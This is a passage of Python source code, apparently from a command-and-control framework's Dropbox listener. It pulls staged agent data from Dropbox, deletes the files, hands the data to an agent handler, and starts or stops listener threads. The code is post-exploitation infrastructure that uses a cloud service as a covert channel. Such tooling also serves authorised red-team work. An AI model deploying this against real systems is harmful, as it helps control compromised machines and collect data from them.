                    message = "[!] Error download data from '{}' : {}".format(
                        fileName, err
                    )
                    signal = json.dumps({"print": True, "message": message})
                    dispatcher.send(
                        signal, sender="listeners/dropbox/{}".format(listenerName)
                    )
                    continue

                responseData = res.content

                try:
                    dbx.files_delete(fileName)
                except dropbox.exceptions.ApiError:
                    listenerName = self.options["Name"]["Value"]
                    message = "[!] Error deleting data at '{}'".format(fileName)
                    signal = json.dumps({"print": True, "message": message})
                    dispatcher.send(
                        signal, sender="listeners/dropbox/{}".format(listenerName)
                    )

                self.mainMenu.agents.handle_agent_data(
                    stagingKey, responseData, listenerOptions
                )

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != "":
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions["Name"]["Value"]
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != "":
            print(helpers.color("[!] Killing listener '%s'" % (name)))
            self.threads[name].kill()
        else:
            print(
                helpers.color(
                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
                )
            )
            self.threads[self.options["Name"]["Value"]].kill()
